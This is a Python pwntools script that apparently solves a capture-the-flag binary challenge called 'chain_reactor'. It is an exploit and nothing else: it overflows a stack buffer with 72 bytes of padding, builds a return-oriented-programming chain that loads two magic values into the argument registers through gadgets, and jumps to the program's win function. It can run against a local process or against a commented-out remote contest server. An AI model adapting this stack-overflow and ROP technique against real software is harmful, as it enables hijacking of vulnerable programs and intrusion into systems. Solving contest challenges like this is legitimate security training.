from pwn import *

context.binary=elf=ELF("./chain_reactor")


p=process(elf.path)
#p=remote("offsec.m0lecon.it",13504)
pop_rdi=ROP(elf).find_gadget(['pop rdi','ret'])[0]
pop_rsi=ROP(elf).find_gadget(['pop rsi','ret'])[0]


ret=ROP(elf).find_gadget(['ret'])[0]

a=0xc0ffee
b=0xbadc0de

offset=64+8
print(p.recv())
payload=flat(
    b'a'*offset,
    p64(pop_rdi),p64(a),
    p64(pop_rsi),p64(b),
    p64(elf.sym.win)

)

p.sendline(payload)


p.interactive()
